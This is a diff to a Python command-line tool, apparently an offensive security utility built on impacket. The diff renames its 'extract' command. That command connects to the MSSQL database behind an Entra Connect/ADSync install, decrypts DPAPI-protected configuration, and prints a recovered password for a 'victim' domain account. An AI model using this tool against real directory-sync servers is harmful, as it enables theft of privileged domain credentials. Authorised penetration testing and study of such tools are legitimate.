@@ -1,6 +1,6 @@
 import typer
 
-from ._shared import sync_app, console, columns
+from ._shared import azsync_app, console, columns
 from impacket.tds import MSSQL
 from impacket.dpapi import (
     DPAPI_BLOB,
@@ -101,9 +101,9 @@ def _decrypt_blob(masterkey_path, blob, entropy, backup_key="", nthash="", sid="
 
     return DPAPI_BLOB(blob).decrypt(key, entropy=entropy)
 
-@sync_app.command("extract")
+@azsync_app.command("extract")
 @handle_cli_errors
-def sync_extract(
+def azsync_extract(
         target: str = typer.Option("127.0.0.1", "-target", help="The IP address of the MSSQL server"),
         port: int = typer.Option(1433, "-port", help="port"),
         windows_auth: bool = typer.Option(False, "-windows-auth", help="Use Windows/NTLM authentication instead of SQL authentication"),
@@ -116,8 +116,7 @@ def sync_extract(
         sid: str = typer.Option(None, "-sid", help="SID of the masterkey owner, required alongside -nthash"),
         output: OutputFormat = output_option(),
 ):
-    """Pull the ADSync configuration (server config + AD management agent)
-    off a MSSQL instance backing an Entra Connect / ADSync install."""
+    """Pull the ADSync configuration off a MSSQL instance backing an Entra Connect / ADSync install."""
     if windows_auth and not domain:
         domain = '.'
     mssql = MSSQL(target, port)
@@ -157,3 +156,5 @@ def sync_extract(
         except ValueError:
             password = decrypted.decode("utf-16-le", errors="ignore").rstrip("\x00")
         console.print(f"[bold green][+][/] Recovered password for {victim_domain}\\{victim_user}: {password}")
+
+
